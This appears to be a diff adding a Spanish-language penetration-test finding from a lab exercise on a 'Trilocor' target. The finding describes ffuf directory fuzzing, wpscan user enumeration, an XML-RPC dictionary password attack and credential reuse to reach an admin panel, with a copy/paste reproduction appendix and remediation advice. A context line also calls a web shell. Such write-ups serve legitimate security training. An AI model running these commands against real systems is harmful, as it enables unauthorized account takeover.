@@ -1003,3 +1003,117 @@ curl -s "$T/web-shell.php?cmd=id" -H "Cookie: PHPSESSID=$SID"
 
 # Trilocor PR Admin (8009)
 
+## Finding — Enumeración de Usuario + Credencial Débil (XML-RPC) → Acceso a Panel Admin (Web 8009)
+
+**Target:** Trilocor — Web corporativa **Hosts:**
+
+- `www.trilocor.local` (puerto base, WordPress)
+- `www.trilocor.local:8009` — panel `/admin`
+
+**Tipo:** Username enumeration (WordPress) + Password attack vía XML-RPC + reutilización de credenciales entre servicios **Severidad:** Alta **Credenciales obtenidas:** `pr-martins` / `martins`
+
+---
+
+### 1. Resumen
+
+El WordPress alojado en el host base expone enumeración de usuarios y permite ataques de contraseña vía el endpoint `xmlrpc.php` (sin rate limiting efectivo). Con `wpscan` se enumeró el usuario `pr-martins` y se obtuvo su contraseña (`martins`) por ataque de diccionario sobre XML-RPC.
+
+Esas credenciales, que **no daban acceso útil en el propio WordPress**, sí funcionaron por **reutilización** en el panel `/admin` de la web del puerto 8009, donde `pr-martins` figura además como miembro del equipo. El resultado es acceso autenticado al panel administrativo.
+
+---
+
+### 2. Descubrimiento del panel admin (8009)
+
+Mediante fuzzing de directorios sobre el host del puerto 8009 se descubre la ruta:
+
+```bash
+ffuf -u "http://www.trilocor.local:8009/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -mc 200,301,302,401,403 \
+  -t 3 -rate 6 -p 0.3-1.0
+# -> /admin
+```
+
+El panel `/admin` requiere autenticación; sin credenciales no expone funcionalidad.
+
+---
+
+### 3. Enumeración de usuario en WordPress (host base)
+
+`pr-martins` también aparece listado como integrante del equipo en la web 8009, lo que sugiere la correlación de usuarios entre servicios. En el WordPress base se confirma el usuario con `wpscan`:
+
+```bash
+wpscan --url http://www.trilocor.local/ --enumerate u
+# -> usuario identificado: pr-martins
+```
+
+---
+
+### 4. Ataque de contraseña vía XML-RPC
+
+El endpoint `xmlrpc.php` permite intentos de autenticación sin el throttling del login web, habilitando un ataque de diccionario eficiente:
+
+```bash
+wpscan --url http://www.trilocor.local/ \
+  --usernames pr-martins \
+  --passwords /ruta/al/wordlist.txt \
+  --password-attack xmlrpc
+# -> credencial válida: pr-martins / martins
+```
+
+> `--password-attack xmlrpc` dirige los intentos a `xmlrpc.php` (método `system.multicall`), mucho más rápido y silencioso que el brute force del `wp-login.php`.
+
+---
+
+### 5. Reutilización de credenciales → acceso al panel 8009
+
+La credencial no habilitaba acciones relevantes en el WordPress, pero **se reutiliza con éxito** en el panel administrativo del puerto 8009:
+
+```
+URL:      http://www.trilocor.local:8009/admin
+Usuario:  pr-martins
+Password: martins
+```
+
+Login exitoso → acceso autenticado al panel admin.
+
+---
+
+### 6. Impacto
+
+- Acceso administrativo al panel de la web 8009 sin credenciales legítimas propias.
+- La reutilización de contraseñas entre servicios convierte una credencial débil de WordPress en acceso a una aplicación distinta.
+- XML-RPC habilitado permite ataques de contraseña masivos eludiendo el rate limiting del login web.
+
+---
+
+### 7. Remediación
+
+1. **Deshabilitar XML-RPC** si no se usa (`xmlrpc.php`), o restringir/limitar sus métodos y aplicar rate limiting.
+2. **Política de contraseñas fuertes**: la contraseña `martins` (derivada del propio username) es trivialmente adivinable. Exigir complejidad mínima y bloqueo tras intentos fallidos.
+3. **No reutilizar credenciales entre servicios**; credenciales únicas por sistema.
+4. **Mitigar la enumeración de usuarios** en WordPress (plugins de hardening, respuestas genéricas) y no exponer nombres de usuario reales en la web pública.
+5. **MFA** en paneles administrativos.
+
+---
+
+### 8. Apéndice — Reproducción (copy/paste)
+
+```bash
+# 1) Descubrir el panel admin (8009)
+ffuf -u "http://www.trilocor.local:8009/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -mc 200,301,302,401,403 -t 3 -rate 6 -p 0.3-1.0
+
+# 2) Enumerar usuario en WordPress base
+wpscan --url http://www.trilocor.local/ --enumerate u
+
+# 3) Password attack vía XML-RPC
+wpscan --url http://www.trilocor.local/ \
+  --usernames pr-martins \
+  --passwords /ruta/al/wordlist.txt \
+  --password-attack xmlrpc
+
+# 4) Reutilizar credencial en el panel 8009
+#    http://www.trilocor.local:8009/admin  ->  pr-martins / martins
+```
